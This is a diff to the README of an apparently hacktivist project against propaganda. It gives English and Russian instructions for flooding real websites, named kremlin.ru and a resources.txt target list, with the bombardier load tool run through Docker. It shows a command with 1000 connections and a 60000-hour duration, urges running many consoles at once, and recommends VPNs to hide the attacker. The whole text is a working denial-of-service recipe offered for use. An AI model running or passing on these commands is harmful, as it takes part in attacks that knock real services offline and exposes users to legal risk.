@@ -3,7 +3,20 @@ Fight agains propoganda
 
 If you have kubertnetes cluster `./run_all_kuber.sh`
 <br>
-From local PC `./run_all_docker.sh`
+
+For BEST usage from local PC/laptop please use VPN
+Psiphon
+Secure VPN
+Proton VPN 
+SurfShark
+
+or
+Clear VPN 
+Proton VPN
+Nord VPN
+
+
+From local PC MAC/Linux `./run_all_docker.sh`
 <br>
 You can specify the path to the file with the URLs: `./run_all_docker.sh file.txt` or `./run_all_kuber.sh file.txt`
 <br>
@@ -32,9 +45,10 @@ or easiest way
 3. Зайти сюда https://github.com/almerico/bombardier/blob/main/README.md 
 4. Найти в программах Windows Command Prompt и запустить от имени Администратора 
 5. Запустить столько отдельных CMD консолей, сколько вы собираетесь запускать скриптов (каждая строчка - скрипт) 
-6. Скопировать скрипт (например docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru) и нажать энтер 
-7. Убедиться, что процесс пошёл 
-8. Ждать падения рашки
+6. Запустить все цели из resources.txt для виндовс из Консли run_windows.bat для Linux/Mac ./run_all_docker.sh для целей из resources.txt (или ./run_all_docker.sh файл-с-целями)
+7. Скопировать скрипт (например docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru) и нажать энтер 
+8. Убедиться, что процесс пошёл 
+9. Ждать падения рашки
 
 
 Instruction for Windows and Mac: 
